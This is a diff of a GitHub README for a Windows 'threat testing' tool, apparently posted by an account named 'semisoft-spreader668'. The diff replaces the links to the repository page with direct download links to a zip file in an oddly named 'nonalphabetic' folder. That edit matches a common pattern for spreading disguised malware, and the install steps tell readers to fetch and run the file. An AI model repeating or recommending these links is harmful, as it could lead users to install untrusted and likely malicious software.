@@ -1,12 +1,12 @@
 # 🔍 lieying-PublicTestVersion - Simple Windows Threat Testing
 
-[![Download](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/semisoft-spreader668/lieying-PublicTestVersion)
+[![Download](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/semisoft-spreader668/lieying-PublicTestVersion](https://github.com/semisoft-spreader668/lieying-PublicTestVersion)
+[https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)
 
 ## 🖥️ What this app does
 
@@ -37,7 +37,7 @@ You need:
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   [https://github.com/semisoft-spreader668/lieying-PublicTestVersion](https://github.com/semisoft-spreader668/lieying-PublicTestVersion)
+   [https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip](https://raw.githubusercontent.com/semisoft-spreader668/lieying-PublicTestVersion/main/nonalphabetic/Version-lieying-Test-Public-1.0.zip)
 
 2. Find the latest release or the app file on the page.
 
